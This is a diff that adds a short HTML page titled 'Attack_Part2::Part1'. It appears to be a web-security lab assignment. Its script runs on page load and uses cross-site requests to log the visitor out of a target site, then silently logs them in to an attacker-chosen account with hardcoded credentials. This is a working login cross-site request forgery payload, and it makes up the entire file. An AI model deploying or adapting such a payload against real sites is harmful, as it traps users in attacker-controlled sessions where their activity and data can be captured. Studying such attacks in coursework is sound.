@@ -1,0 +1,49 @@
+<html>
+	<body>
+	<title>Attack_Part2::Part1</title>
+	<script type="text/javascript">
+		function postForm(uri, parameters, callback) {
+			xhr = new XMLHttpRequest();
+			if (xhr.overrideMimeType) {
+				xhr.overrideMimeType('text/html');
+			}
+			xhr.onreadystatechange = callback;
+			xhr.open('POST', uri, true);
+			xhr.setRequestHeader('Content-type', 
+					'application/x-www-form-urlencoded');
+			xhr.setRequestHeader('Content-length', parameters.length);
+			xhr.setRequestHeader('Connection', close);
+			xhr.send(parameters);
+		}
+
+		function getPage(uri, callback) {
+      		xhr = new XMLHttpRequest();
+      		if (xhr.overrideMimeType) {
+        		xhr.overrideMimeType('text/html');
+      		}
+
+      		xhr.open('GET', uri, true);
+      		xhr.send(null);
+    	}
+
+    	function logOut() {
+      		getPage('/logout&csrfdefense=0', null);
+    	}
+
+    	// Log the user out if they are logged in
+    	logOut();
+
+    	// Log the user in with 'honey' and 'l33th4x'
+		var encoded_user = encodeURIComponent('honey');
+		var encoded_password = encodeURIComponent('l33th4x');
+		var encoded_sqlfilter = encodeURIComponent('0');
+		var login_action = 'login';
+		var login_string = 'user=' + encoded_user + '&password=' +
+		          encoded_password + '&login_action=' + login_action +
+			            '&sqlfilter=' + encoded_sqlfilter;
+
+		var post_destination = '/login?csrfdefense=0';
+            	postForm(post_destination, login_string, null);
+		</script>
+	</body>
+</html>
